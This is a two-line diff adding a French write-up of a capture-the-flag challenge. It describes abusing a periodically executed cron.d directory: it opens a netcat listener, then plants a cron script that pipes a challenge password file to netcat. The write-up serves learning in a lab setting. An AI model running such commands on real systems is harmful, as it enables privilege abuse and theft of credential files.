@@ -1,0 +1,2 @@
+Le fichier ch4 nous apprend que les script dans cron.d sont exécuté périodiquement. On ouvre un netcat sur la machine : nc -lvnp 4444
+Dans une autre fenêtre on envoie cette commande : echo "cat /challenge/app-script/ch4/.passwd | netcat localhost 4444" > cron.d/test && chmod o+rx cron.d/test
